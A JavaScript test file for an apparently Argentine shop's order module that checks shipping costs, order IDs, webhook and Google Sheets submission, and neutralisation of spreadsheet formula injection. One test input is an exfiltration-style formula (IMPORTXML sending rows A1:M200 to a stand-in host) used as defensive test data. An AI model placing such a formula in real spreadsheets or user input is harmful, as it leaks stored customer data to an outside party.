import test from 'node:test';
import assert from 'node:assert/strict';
import { appendOrder, generateOrderId, estimateShippingCost } from '../lib/orders.js';

test('generateOrderId: genera prefijo VIT- con fecha y caracteres únicos', () => {
  const id1 = generateOrderId();
  const id2 = generateOrderId();
  assert.match(id1, /^VIT-\d{8}-[A-Z0-9]+$/);
  assert.notEqual(id1, id2);
});

test('estimateShippingCost: calcula costos por zona y envío gratis > $70.000', () => {
  assert.equal(estimateShippingCost('Villa Allende', 15000), 3000);
  assert.equal(estimateShippingCost('Mendiolaza', 20000), 3000);
  assert.equal(estimateShippingCost('El Talar (Mendiolaza)', 20000), 3000);
  assert.equal(estimateShippingCost('Río Ceballos', 25000), 5000);
  assert.equal(estimateShippingCost('Unquillo', 10000), 5000);
  assert.equal(estimateShippingCost('La Calera', 5000), 5000);
  assert.equal(estimateShippingCost('Villa Allende', 75000), 0);
  assert.equal(estimateShippingCost('Buenos Aires', 10000), null);
});

test('appendOrder: sin webhook ni service account devuelve orderId sin fallar', async () => {
  const prevWebhook = process.env.ORDERS_WEBHOOK_URL;
  const prevSheet = process.env.GOOGLE_ORDERS_SHEET_ID;
  delete process.env.ORDERS_WEBHOOK_URL;
  delete process.env.GOOGLE_ORDERS_SHEET_ID;

  try {
    const orderId = await appendOrder({
      name: 'Ana',
      locality: 'Villa Allende',
      province: 'Córdoba',
      notes: 'Sin azúcar',
      items: '2x Almendras (1 KG)',
      total: 10000,
      whatsappUrl: 'https://wa.me/549111'
    });
    assert.match(orderId, /^VIT-/);
  } finally {
    if (prevWebhook !== undefined) process.env.ORDERS_WEBHOOK_URL = prevWebhook;
    if (prevSheet !== undefined) process.env.GOOGLE_ORDERS_SHEET_ID = prevSheet;
  }
});

test('appendOrder: envía datos completos (precios, fechas, costo envío) al webhook', async () => {
  let capturedUrl = null;
  let capturedBody = null;
  const originalFetch = globalThis.fetch;

  globalThis.fetch = async (url, options) => {
    capturedUrl = String(url);
    capturedBody = JSON.parse(options.body);
    return new Response(JSON.stringify({ status: 'ok' }), { status: 200 });
  };

  process.env.ORDERS_WEBHOOK_URL = 'https://script.google.com/macros/s/test/exec';

  try {
    const orderId = await appendOrder({
      name: 'Carlos Test',
      locality: 'Mendiolaza',
      province: 'Córdoba',
      notes: 'Timbre 2B',
      items: '1x Mix Frutos Secos (500 G); 2x Miel (500 G)',
      total: 8500,
      status: 'Pendiente',
      whatsappUrl: 'https://wa.me/549351?text=pedido'
    });

    assert.equal(capturedUrl, 'https://script.google.com/macros/s/test/exec');
    assert.equal(capturedBody.name, 'Carlos Test');
    assert.equal(capturedBody.locality, 'Mendiolaza');
    assert.equal(capturedBody.province, 'Córdoba');
    assert.equal(capturedBody.notes, 'Timbre 2B');
    assert.equal(capturedBody.items, '1x Mix Frutos Secos (500 G); 2x Miel (500 G)');
    assert.equal(capturedBody.precio_pedido, 8500);
    assert.equal(capturedBody.costo_envio, 3000); // 3000 por Mendiolaza
    assert.equal(capturedBody.total, 11500); // 8500 + 3000
    assert.equal(capturedBody.status, 'Pendiente');
    assert.equal(capturedBody.fecha_entrega, 'A coordinar');
    assert.equal(capturedBody.orderId, orderId);
    assert.ok(capturedBody.fecha_pedido);
  } finally {
    globalThis.fetch = originalFetch;
    delete process.env.ORDERS_WEBHOOK_URL;
  }
});

test('sanitize: neutraliza valores que Sheets interpretaría como fórmula', async () => {
  const { sanitize } = await import('../lib/orders.js');
  assert.equal(sanitize('=1+1'), "'=1+1");
  assert.equal(sanitize('+SUM(A1)'), "'+SUM(A1)");
  assert.equal(sanitize('-2+3'), "'-2+3");
  assert.equal(sanitize('@cmd'), "'@cmd");
  assert.equal(sanitize('=IMPORTXML("https://x.test/?d="&A1:M200)'), `'=IMPORTXML("https://x.test/?d="&A1:M200)`);
  assert.equal(sanitize('Ana María'), 'Ana María');
  assert.equal(sanitize('Villa Allende'), 'Villa Allende');
});

async function captureSheetRow(order) {
  const { generateKeyPairSync } = await import('node:crypto');
  const { privateKey } = generateKeyPairSync('rsa', { modulusLength: 2048 });
  const keys = ['ORDERS_WEBHOOK_URL', 'GOOGLE_ORDERS_WEBHOOK_URL', 'GOOGLE_SERVICE_ACCOUNT_JSON', 'GOOGLE_SERVICE_ACCOUNT_EMAIL', 'GOOGLE_PRIVATE_KEY', 'GOOGLE_ORDERS_SHEET_ID'];
  const prev = Object.fromEntries(keys.map(k => [k, process.env[k]]));
  for (const k of keys) delete process.env[k];
  process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL = 'dummy@test.invalid';
  process.env.GOOGLE_PRIVATE_KEY = privateKey.export({ type: 'pkcs8', format: 'pem' });
  process.env.GOOGLE_ORDERS_SHEET_ID = 'dummy-sheet';
  const originalFetch = globalThis.fetch;
  const calls = [];
  globalThis.fetch = async (url, options) => {
    calls.push(String(url));
    if (String(url).startsWith('https://oauth2.googleapis.com/token')) return Response.json({ access_token: 'dummy-token', expires_in: 3600 });
    if (String(url).startsWith('https://sheets.googleapis.com/')) { calls.body = JSON.parse(options.body); calls.sheetUrl = String(url); return Response.json({}); }
    throw new Error(`unexpected fetch ${url}`);
  };
  try {
    const orderId = await appendOrder(order);
    return { orderId, url: calls.sheetUrl, body: calls.body };
  } finally {
    globalThis.fetch = originalFetch;
    for (const k of keys) { if (prev[k] === undefined) delete process.env[k]; else process.env[k] = prev[k]; }
  }
}

test('appendOrder (Sheets API): usa RAW, neutraliza fórmulas y mantiene columnas', async () => {
  const { orderId, url, body } = await captureSheetRow({
    name: '=1+1',
    locality: '+SUM(A1)',
    province: 'Córdoba',
    notes: '@cmd',
    items: '2x Almendras (1 KG)',
    total: 10000,
    whatsappUrl: 'https://wa.me/549111?text=pedido'
  });
  assert.match(url, /valueInputOption=RAW/);
  assert.doesNotMatch(url, /USER_ENTERED/);
  assert.match(url, /dummy-sheet:append/);
  assert.equal(body.range, 'Pedidos!A:M');
  const row = body.values[0];
  assert.equal(row.length, 13);
  assert.equal(row[0], orderId);
  assert.match(row[0], /^VIT-\d{8}-[A-Z0-9]+$/);
  assert.ok(row[1]);
  assert.equal(row[2], 'A coordinar');
  assert.equal(row[3], "'=1+1");
  assert.equal(row[4], "'+SUM(A1)");
  assert.equal(row[5], 'Córdoba');
  assert.equal(row[6], '2x Almendras (1 KG)');
  assert.equal(row[7], 10000);
  assert.equal(row[8], 'A coordinar');
  assert.equal(row[9], 10000);
  assert.equal(row[10], 'Pendiente');
  assert.equal(row[11], "'@cmd");
  assert.equal(row[12], 'https://wa.me/549111?text=pedido');
});

test('appendOrder (Sheets API): un pedido normal queda igual y los montos son números', async () => {
  const { body } = await captureSheetRow({
    name: 'Ana María',
    locality: 'Mendiolaza',
    province: 'Córdoba',
    notes: 'Timbre 2B',
    items: '1x Miel (500 G)',
    total: 8500.5,
    whatsappUrl: 'https://wa.me/549111'
  });
  const row = body.values[0];
  assert.equal(row[3], 'Ana María');
  assert.equal(row[4], 'Mendiolaza');
  assert.equal(row[11], 'Timbre 2B');
  assert.equal(row[7], 8500.5);
  assert.equal(row[8], 3000);
  assert.equal(row[9], 11500.5);
});

test('appendOrder (webhook): también neutraliza fórmulas en el payload', async () => {
  const originalFetch = globalThis.fetch;
  let captured;
  globalThis.fetch = async (url, options) => { captured = JSON.parse(options.body); return Response.json({ status: 'ok' }); };
  process.env.ORDERS_WEBHOOK_URL = 'https://script.google.com/macros/s/test/exec';
  try {
    await appendOrder({ name: '=1+1', locality: '+SUM(A1)', province: 'Córdoba', notes: '@cmd', items: '1x Miel', total: 100 });
    assert.equal(captured.name, "'=1+1");
    assert.equal(captured.locality, "'+SUM(A1)");
    assert.equal(captured.notes, "'@cmd");
  } finally {
    globalThis.fetch = originalFetch;
    delete process.env.ORDERS_WEBHOOK_URL;
  }
});
